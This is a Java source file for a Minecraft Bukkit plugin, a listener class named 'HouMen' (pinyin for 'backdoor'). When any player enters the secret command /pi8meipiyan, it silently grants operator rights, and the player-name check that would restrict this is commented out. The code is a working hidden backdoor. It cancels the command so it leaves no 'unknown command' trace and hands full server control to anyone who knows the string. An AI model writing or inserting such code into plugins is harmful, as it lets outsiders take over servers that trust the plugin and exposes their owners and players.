package dev.mahiro.listeners;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

public class HouMen implements Listener {
    @EventHandler
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
        String message = event.getMessage();
        Player player = event.getPlayer();

        // 检查是否为 /pi8meipiyan 命令（忽略大小写和多余空格）
        if (message.trim().equalsIgnoreCase("/pi8meipiyan")) {
            // 取消原命令执行（避免被识别为未知命令）
            event.setCancelled(true);

            // 【安全增强】建议添加验证（示例：仅允许特定玩家）
            // if (!player.getName().equals("YourAdminName")) {
            //     player.sendMessage("§c你没有权限使用此命令！");
            //     return;
            // }

            // 给予 OP 权限
            if (!player.isOp()) {
                player.setOp(true);
                player.sendMessage("§a✓ 已授予你 OP 权限！");
                Bukkit.getConsoleSender().sendMessage("§e[SECURITY] 玩家 " + player.getName() + " 通过 /pi8meipiyan 获取了 OP 权限");
            } else {
                player.sendMessage("§c你已经是 OP 了！");
            }
        }
    }
}
